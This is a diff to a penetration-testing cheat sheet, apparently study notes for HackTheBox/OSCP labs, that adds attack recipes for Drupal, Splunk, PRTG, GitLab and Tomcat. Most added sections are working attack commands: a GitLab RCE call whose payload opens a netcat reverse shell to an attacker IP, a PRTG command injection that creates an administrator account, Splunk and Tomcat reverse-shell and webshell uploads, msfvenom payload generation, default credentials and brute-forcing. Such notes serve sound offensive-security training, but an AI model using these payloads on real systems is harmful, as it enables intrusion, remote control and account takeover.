@@ -14,6 +14,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [tar](#tar)
   - [proof.txt](#proof.txt)
   - [gitdumper](#gitdumper)
   - [KPCLI && kdbx](#kpcli_&&_kdbx)
@@ -65,6 +66,7 @@
   - [WinRM](#winrm)
   - [sc.exe](#sc.exe)
   - [smtp-user-enum](#smtp-user-enum)
+  - [bash](#bash)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -86,6 +88,10 @@
 - [FTP](#ftp)
 - [Jenkins](#jenkins)
 - [Joomla](#joomla)
+- [Drupal](#drupal)
+- [Splunk](#splunk)
+- [PRTG Network Monitor](#prtg_network_monitor)
+- [Wordpress](#wordpress)
 - [Active Directory](#active-directory)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   - [Manual Enumeration](#manual-enumeration)
@@ -639,6 +645,15 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### tar
+```bash
+# extract its contents
+tar xvf captcha-8.x-1.2.tar.gz
+
+# create an archive
+tar cvf captcha.tar.gz captcha/
+```
+
 ### proof.txt
 ```bash
 # When we have a random txt file instead of proof.txt
@@ -1470,7 +1485,15 @@ smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-
 smtp-user-enum -M VRFY -U usernames.txt -t 10.129.182.186 -w 10
 ```
 
-# with powershell
+### bash
+```bash
+# search for flag.txt
+find / 
+```
+
+
+### with powershell
+```bash
 $username = 'Administrator';
 $password = 'Mypass123';
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
@@ -1480,6 +1503,8 @@ Enter-PSSession -Computername TARGET -Credential $credential
 or
 Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
 ```
+
+
 
 
 ### bloodhound-python
@@ -2235,13 +2260,13 @@ python3 ./joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasp
 
 # Drupal
 ```bash
-# check CHANGELOG.txt or README.exe, robots.txt, /node
+# enum - check CHANGELOG.txt or README.exe, robots.txt, /node
 curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
 
-# droppescan
+# enum - droppescan
 droopescan scan drupal -u http://drupal.inlanefreight.local
 
-# Leveraging the PHP Filter Module(before version 8)
+# ATTACK - Leveraging the PHP Filter Module(before version 8)
 click modules
 check "PHP filter" and git "Save configuration"
 Next, we could go to Content --> Add content and create a Basic page
@@ -2249,16 +2274,47 @@ Make sure to select "PHP code"
 ## check if it works with curl
 curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
 
-# Leveraging the PHP Filter Module(after version 8)
+# ATTACK 2 -Leveraging the PHP Filter Module(after version 8)
 ## Download filter on attack machine
 wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 # Once downloaded go to Administration > Reports > Available updates
 drupal-qa.inlanefreight.local/admin/reports/updates/install
 # 
+```
 
+# Splunk
+![image](https://github.com/nuricheun/OSCP/assets/14031269/2cbdb5c9-768b-412e-ac7a-f6492679a9be)
 
+```bash
+# Abusing Built-In Functionality
+1. clone this repo https://github.com/0xjpuff/reverse_shell_splunk
+git clone https://github.com/0xjpuff/reverse_shell_splunk
+2. The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell)
+change the attacker's ip and port number
+3. compress 
+tar -cvzf updater.tar.gz splunk_shell/
+3. The next step is to choose Install app from file and upload the application(check the image above)
+4. Run netcat
+sudo nc -lnvp 443
+5. On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.
+```
 
+# PRTG Network Monitor
+```bash
+# version enum
+curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
 
+# Leveraging Known Vulnerabilities
+1. To begin, mouse over Setup in the top right and then the Account Settings menu and finally click on Notifications
+2. Add new notification.
+3. Give the notification a name and scroll down and tick the box next to EXECUTE PROGRAM.
+4. Under Program File, select Demo exe notification - outfile.ps1 from the drop-down.
+5. Finally, in the parameter field, enter a command
+test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+6. Save
+7. Click the Test button to run our notification and execute the command to add a local admin user
+8. Check if new user has been created
+crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
 ```
 
 # Wordpress
@@ -2286,6 +2342,51 @@ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campai
 
 # Vulnerable Plugins - wpDiscuz
 python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+```
+
+# Gitlab
+```bash
+# version enum
+The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in
+
+# See if there's anything public
+We should first go to /explore
+
+# Username enumeration
+git clone https://github.com/dpgg101/GitLabUserEnum
+python3 ./gitlab_user_enum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist --wordlist /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Authenticated RCE
+mightyllama@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+```
+
+# Tomcat
+```bash
+# version enum - if we're trying to reach invalid page, we can get the version information!
+http://app-dev.inlanefreight.local:8080/invalid
+# or check docs page
+curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
+
+# enumeration - check /manager or /host-manager pages && bruteforce
+python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+
+# useful default credentials
+tomcat:tomcat, admin:admin
+
+# Tomcat Manager - WAR File Upload
+1. download jsp webshell and create war file
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp
+2. Click on Browse to select the .war file and then click on Deploy
+3. This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
+http://web01.inlanefreight.local:8180/backup/cmd.jsp
+
+# Tomcat Manager - WAR File Upload 2
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.29 LPORT=443 -f war > backup.war
+
+# CVE-2020-1938 : Ghostcat (https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
+# This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat.
+python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
 ```
 
 # Active Directory
